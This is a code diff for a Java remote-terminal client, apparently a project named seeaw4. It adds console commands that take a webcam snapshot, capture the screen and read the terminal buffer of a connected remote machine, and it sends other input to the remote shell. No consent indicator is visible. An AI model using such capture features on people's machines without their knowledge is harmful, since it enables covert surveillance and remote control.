@@ -19,14 +19,24 @@ import wang.ismy.seeaw4.common.message.impl.ImgMessage;
 import wang.ismy.seeaw4.common.message.impl.TextMessage;
 import wang.ismy.seeaw4.common.promise.ConnectionPromise;
 import wang.ismy.seeaw4.common.utils.JsonUtils;
+import wang.ismy.seeaw4.common.utils.SwingUtils;
+import wang.ismy.seeaw4.terminal.Resolution;
 import wang.ismy.seeaw4.terminal.Terminal;
+import wang.ismy.seeaw4.terminal.camera.Camera;
+import wang.ismy.seeaw4.terminal.desktop.Desktop;
+import wang.ismy.seeaw4.terminal.enums.ImgType;
 import wang.ismy.seeaw4.terminal.enums.ShellType;
 import wang.ismy.seeaw4.terminal.impl.CommonTerminal;
 import wang.ismy.seeaw4.terminal.observer.impl.LazyTerminalObserver;
 
 
+import javax.imageio.ImageIO;
+import javax.swing.*;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayInputStream;
 import java.io.IOException;
 
+import java.util.Arrays;
 import java.util.List;
 import java.util.Scanner;
 import java.util.stream.Collectors;
@@ -109,7 +119,20 @@ public class Client {
             if (str.contains("-")){
                 client.terminalProxy.setRemoteClientId(str);
                 client.terminalProxy.bind();
-            }else{
+            }else if(str.equals("camera")){
+                Camera camera = client.terminalProxy.getCamera();
+                byte[] bytes = camera.getCameraSnapshot(ImgType.JPEG, new Resolution(640, 480));
+                SwingUtils.showImg(bytes);
+
+            }else if(str.equals("screen")){
+                Desktop desktop = client.terminalProxy.getDesktop();
+                byte[] screen = desktop.getScreen(ImgType.JPEG, new Resolution(1366, 768));
+                SwingUtils.showImg(screen);
+            }else if(str.equals("buffer")){
+                String buffer = client.terminalProxy.getTerminalBuffer();
+                System.out.print(buffer);
+            }
+            else{
                 client.terminalProxy.input(str);
             }
         }
